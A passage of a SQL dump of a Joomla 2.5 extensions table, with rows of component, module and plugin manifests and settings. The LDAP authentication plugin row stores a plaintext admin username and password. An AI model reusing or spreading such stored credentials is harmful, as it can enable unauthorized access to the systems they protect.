(17, 'com_newsfeeds', 'component', 'com_newsfeeds', '', 1, 1, 1, 0, '{"legacy":false,"name":"com_newsfeeds","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_NEWSFEEDS_XML_DESCRIPTION","group":""}', '{"show_feed_image":"1","show_feed_description":"1","show_item_description":"1","feed_word_count":"0","show_headings":"1","show_name":"1","show_articles":"0","show_link":"1","show_description":"1","show_description_image":"1","display_num":"","show_pagination_limit":"1","show_pagination":"1","show_pagination_results":"1","show_cat_items":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(18, 'com_plugins', 'component', 'com_plugins', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_plugins","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_PLUGINS_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(19, 'com_search', 'component', 'com_search', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_search","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_SEARCH_XML_DESCRIPTION","group":""}', '{"enabled":"0","show_date":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(20, 'com_templates', 'component', 'com_templates', '', 1, 1, 1, 1, '{"legacy":false,"name":"com_templates","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_TEMPLATES_XML_DESCRIPTION","group":""}', '{"template_positions_display":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(21, 'com_weblinks', 'component', 'com_weblinks', '', 1, 1, 1, 0, '{"legacy":false,"name":"com_weblinks","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\n\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_WEBLINKS_XML_DESCRIPTION","group":""}', '{"target":"1","count_clicks":"1","icons":1,"link_icons":"","category_layout":"_:default","show_category_title":"1","show_description":"1","show_description_image":"1","maxLevel":"-1","show_empty_categories":"0","show_subcat_desc":"1","show_cat_num_links":"1","show_base_description":"1","maxLevelcat":"-1","show_empty_categories_cat":"0","show_subcat_desc_cat":"1","show_cat_num_links_cat":"1","show_pagination_limit":"1","show_headings":"0","show_link_description":"1","show_link_hits":"1","show_pagination":"2","show_pagination_results":"1","show_feed_link":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(22, 'com_content', 'component', 'com_content', '', 1, 1, 0, 1, '{"legacy":false,"name":"com_content","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_CONTENT_XML_DESCRIPTION","group":""}', '{"article_layout":"_:default","show_title":"1","link_titles":"0","show_intro":"0","show_category":"0","link_category":"0","show_parent_category":"0","link_parent_category":"0","show_author":"0","link_author":"0","show_create_date":"0","show_modify_date":"0","show_publish_date":"0","show_item_navigation":"0","show_vote":"0","show_readmore":"1","show_readmore_title":"0","readmore_limit":"100","show_icons":"0","show_print_icon":"0","show_email_icon":"0","show_hits":"0","show_noauth":"0","urls_position":"0","show_publishing_options":"1","show_article_options":"1","show_urls_images_frontend":"0","show_urls_images_backend":"0","targeta":0,"targetb":0,"targetc":0,"float_intro":"right","float_fulltext":"right","category_layout":"_:blog","show_category_heading_title_text":"1","show_category_title":"0","show_description":"0","show_description_image":"0","maxLevel":"1","show_empty_categories":"0","show_no_articles":"1","show_subcat_desc":"1","show_cat_num_articles":"0","show_base_description":"1","maxLevelcat":"-1","show_empty_categories_cat":"0","show_subcat_desc_cat":"1","show_cat_num_articles_cat":"1","num_leading_articles":"1","num_intro_articles":"4","num_columns":"2","num_links":"4","multi_column_order":"0","show_subcategory_content":"0","show_pagination_limit":"1","filter_field":"hide","show_headings":"1","list_show_date":"0","date_format":"","list_show_hits":"1","list_show_author":"1","orderby_pri":"order","orderby_sec":"rdate","order_date":"published","show_pagination":"2","show_pagination_results":"1","show_feed_link":"1","feed_summary":"0","feed_show_readmore":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(23, 'com_config', 'component', 'com_config', '', 1, 1, 0, 1, '{"legacy":false,"name":"com_config","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_CONFIG_XML_DESCRIPTION","group":""}', '{"filters":{"1":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"6":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"7":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"2":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"3":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"4":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"5":{"filter_type":"BL","filter_tags":"","filter_attributes":""},"8":{"filter_type":"BL","filter_tags":"","filter_attributes":""}}}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(24, 'com_redirect', 'component', 'com_redirect', '', 1, 1, 0, 1, '{"legacy":false,"name":"com_redirect","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_REDIRECT_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(25, 'com_users', 'component', 'com_users', '', 1, 1, 0, 1, '{"legacy":false,"name":"com_users","type":"component","creationDate":"April 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.\\t","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"COM_USERS_XML_DESCRIPTION","group":""}', '{"allowUserRegistration":"1","new_usertype":"2","useractivation":"1","frontend_userparams":"1","mailSubjectPrefix":"","mailBodySuffix":""}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(100, 'PHPMailer', 'library', 'phpmailer', '', 0, 1, 1, 1, '{"legacy":false,"name":"PHPMailer","type":"library","creationDate":"2001","author":"PHPMailer","copyright":"(c) 2001-2003, Brent R. Matzelle, (c) 2004-2009, Andy Prevost. All Rights Reserved., (c) 2010-2011, Jim Jagielski. All Rights Reserved.","authorEmail":"jimjag@gmail.com","authorUrl":"https:\\/\\/code.google.com\\/a\\/apache-extras.org\\/p\\/phpmailer\\/","version":"5.2","description":"LIB_PHPMAILER_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(101, 'SimplePie', 'library', 'simplepie', '', 0, 1, 1, 1, '{"legacy":false,"name":"SimplePie","type":"library","creationDate":"2004","author":"SimplePie","copyright":"Copyright (c) 2004-2009, Ryan Parman and Geoffrey Sneddon","authorEmail":"","authorUrl":"http:\\/\\/simplepie.org\\/","version":"1.2","description":"LIB_SIMPLEPIE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(102, 'phputf8', 'library', 'phputf8', '', 0, 1, 1, 1, '{"legacy":false,"name":"phputf8","type":"library","creationDate":"2006","author":"Harry Fuecks","copyright":"Copyright various authors","authorEmail":"hfuecks@gmail.com","authorUrl":"http:\\/\\/sourceforge.net\\/projects\\/phputf8","version":"0.5","description":"LIB_PHPUTF8_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(103, 'Joomla! Platform', 'library', 'joomla', '', 0, 1, 1, 1, '{"legacy":false,"name":"Joomla! Platform","type":"library","creationDate":"2008","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"http:\\/\\/www.joomla.org","version":"11.4","description":"LIB_JOOMLA_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(200, 'mod_articles_archive', 'module', 'mod_articles_archive', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_articles_archive","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters.\\n\\t\\tAll rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_ARTICLES_ARCHIVE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(201, 'mod_articles_latest', 'module', 'mod_articles_latest', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_articles_latest","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_LATEST_NEWS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(202, 'mod_articles_popular', 'module', 'mod_articles_popular', '', 0, 1, 1, 0, '{"legacy":false,"name":"mod_articles_popular","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_POPULAR_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(203, 'mod_banners', 'module', 'mod_banners', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_banners","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_BANNERS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(204, 'mod_breadcrumbs', 'module', 'mod_breadcrumbs', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_breadcrumbs","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_BREADCRUMBS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(205, 'mod_custom', 'module', 'mod_custom', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_custom","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_CUSTOM_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(206, 'mod_feed', 'module', 'mod_feed', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_feed","type":"module","creationDate":"July 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_FEED_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(207, 'mod_footer', 'module', 'mod_footer', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_footer","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_FOOTER_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(208, 'mod_login', 'module', 'mod_login', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_login","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_LOGIN_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(209, 'mod_menu', 'module', 'mod_menu', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_menu","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_MENU_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(210, 'mod_articles_news', 'module', 'mod_articles_news', '', 0, 1, 1, 0, '{"legacy":false,"name":"mod_articles_news","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_ARTICLES_NEWS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(211, 'mod_random_image', 'module', 'mod_random_image', '', 0, 1, 1, 0, '{"legacy":false,"name":"mod_random_image","type":"module","creationDate":"July 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_RANDOM_IMAGE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(212, 'mod_related_items', 'module', 'mod_related_items', '', 0, 1, 1, 0, '{"legacy":false,"name":"mod_related_items","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_RELATED_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(213, 'mod_search', 'module', 'mod_search', '', 0, 1, 1, 0, '{"legacy":false,"name":"mod_search","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_SEARCH_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(214, 'mod_stats', 'module', 'mod_stats', '', 0, 1, 1, 0, '{"legacy":false,"name":"mod_stats","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_STATS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(215, 'mod_syndicate', 'module', 'mod_syndicate', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_syndicate","type":"module","creationDate":"May 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_SYNDICATE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(216, 'mod_users_latest', 'module', 'mod_users_latest', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_users_latest","type":"module","creationDate":"December 2009","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_USERS_LATEST_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(217, 'mod_weblinks', 'module', 'mod_weblinks', '', 0, 1, 1, 0, '{"legacy":false,"name":"mod_weblinks","type":"module","creationDate":"July 2009","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_WEBLINKS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(218, 'mod_whosonline', 'module', 'mod_whosonline', '', 0, 1, 1, 0, '{"legacy":false,"name":"mod_whosonline","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_WHOSONLINE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(219, 'mod_wrapper', 'module', 'mod_wrapper', '', 0, 1, 1, 0, '{"legacy":false,"name":"mod_wrapper","type":"module","creationDate":"October 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_WRAPPER_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(220, 'mod_articles_category', 'module', 'mod_articles_category', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_articles_category","type":"module","creationDate":"February 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_ARTICLES_CATEGORY_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(221, 'mod_articles_categories', 'module', 'mod_articles_categories', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_articles_categories","type":"module","creationDate":"February 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_ARTICLES_CATEGORIES_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(222, 'mod_languages', 'module', 'mod_languages', '', 0, 1, 1, 1, '{"legacy":false,"name":"mod_languages","type":"module","creationDate":"February 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_LANGUAGES_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(300, 'mod_custom', 'module', 'mod_custom', '', 1, 1, 1, 1, '{"legacy":false,"name":"mod_custom","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_CUSTOM_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(301, 'mod_feed', 'module', 'mod_feed', '', 1, 1, 1, 0, '{"legacy":false,"name":"mod_feed","type":"module","creationDate":"July 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_FEED_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(302, 'mod_latest', 'module', 'mod_latest', '', 1, 1, 1, 0, '{"legacy":false,"name":"mod_latest","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_LATEST_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(303, 'mod_logged', 'module', 'mod_logged', '', 1, 1, 1, 0, '{"legacy":false,"name":"mod_logged","type":"module","creationDate":"January 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_LOGGED_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(304, 'mod_login', 'module', 'mod_login', '', 1, 1, 1, 1, '{"legacy":false,"name":"mod_login","type":"module","creationDate":"March 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_LOGIN_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(305, 'mod_menu', 'module', 'mod_menu', '', 1, 1, 1, 0, '{"legacy":false,"name":"mod_menu","type":"module","creationDate":"March 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_MENU_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(307, 'mod_popular', 'module', 'mod_popular', '', 1, 1, 1, 0, '{"legacy":false,"name":"mod_popular","type":"module","creationDate":"July 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_POPULAR_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(308, 'mod_quickicon', 'module', 'mod_quickicon', '', 1, 1, 1, 1, '{"legacy":false,"name":"mod_quickicon","type":"module","creationDate":"Nov 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_QUICKICON_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(309, 'mod_status', 'module', 'mod_status', '', 1, 1, 1, 0, '{"legacy":false,"name":"mod_status","type":"module","creationDate":"Feb 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_STATUS_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(310, 'mod_submenu', 'module', 'mod_submenu', '', 1, 1, 1, 0, '{"legacy":false,"name":"mod_submenu","type":"module","creationDate":"Feb 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_SUBMENU_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(311, 'mod_title', 'module', 'mod_title', '', 1, 1, 1, 0, '{"legacy":false,"name":"mod_title","type":"module","creationDate":"Nov 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_TITLE_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(312, 'mod_toolbar', 'module', 'mod_toolbar', '', 1, 1, 1, 1, '{"legacy":false,"name":"mod_toolbar","type":"module","creationDate":"Nov 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_TOOLBAR_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(313, 'mod_multilangstatus', 'module', 'mod_multilangstatus', '', 1, 1, 1, 0, '{"legacy":false,"name":"mod_multilangstatus","type":"module","creationDate":"September 2011","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"MOD_MULTILANGSTATUS_XML_DESCRIPTION","group":""}', '{"cache":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(400, 'plg_authentication_gmail', 'plugin', 'gmail', 'authentication', 0, 0, 1, 0, '{"legacy":false,"name":"plg_authentication_gmail","type":"plugin","creationDate":"February 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_GMAIL_XML_DESCRIPTION","group":""}', '{"applysuffix":"0","suffix":"","verifypeer":"1","user_blacklist":""}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(401, 'plg_authentication_joomla', 'plugin', 'joomla', 'authentication', 0, 1, 1, 1, '{"legacy":false,"name":"plg_authentication_joomla","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_AUTH_JOOMLA_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(402, 'plg_authentication_ldap', 'plugin', 'ldap', 'authentication', 0, 0, 1, 0, '{"legacy":false,"name":"plg_authentication_ldap","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_LDAP_XML_DESCRIPTION","group":""}', '{"host":"","port":"389","use_ldapV3":"0","negotiate_tls":"0","no_referrals":"0","auth_method":"bind","base_dn":"","search_string":"","users_dn":"","username":"admin","password":"bobby7","ldap_fullname":"fullName","ldap_email":"mail","ldap_uid":"uid"}', '', '', 0, '0000-00-00 00:00:00', 3, 0),
(404, 'plg_content_emailcloak', 'plugin', 'emailcloak', 'content', 0, 1, 1, 0, '{"legacy":false,"name":"plg_content_emailcloak","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_CONTENT_EMAILCLOAK_XML_DESCRIPTION","group":""}', '{"mode":"1"}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(405, 'plg_content_geshi', 'plugin', 'geshi', 'content', 0, 0, 1, 0, '{"legacy":false,"name":"plg_content_geshi","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"","authorUrl":"qbnz.com\\/highlighter","version":"2.5.0","description":"PLG_CONTENT_GESHI_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 2, 0),
(406, 'plg_content_loadmodule', 'plugin', 'loadmodule', 'content', 0, 1, 1, 0, '{"legacy":false,"name":"plg_content_loadmodule","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_LOADMODULE_XML_DESCRIPTION","group":""}', '{"style":"none"}', '', '', 390, '2012-07-11 13:56:33', 0, 0),
(407, 'plg_content_pagebreak', 'plugin', 'pagebreak', 'content', 0, 1, 1, 1, '{"legacy":false,"name":"plg_content_pagebreak","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_CONTENT_PAGEBREAK_XML_DESCRIPTION","group":""}', '{"title":"1","multipage_toc":"1","showall":"1"}', '', '', 0, '0000-00-00 00:00:00', 4, 0),
(408, 'plg_content_pagenavigation', 'plugin', 'pagenavigation', 'content', 0, 1, 1, 1, '{"legacy":false,"name":"plg_content_pagenavigation","type":"plugin","creationDate":"January 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_PAGENAVIGATION_XML_DESCRIPTION","group":""}', '{"position":"1"}', '', '', 0, '0000-00-00 00:00:00', 5, 0),
(409, 'plg_content_vote', 'plugin', 'vote', 'content', 0, 1, 1, 1, '{"legacy":false,"name":"plg_content_vote","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_VOTE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 6, 0),
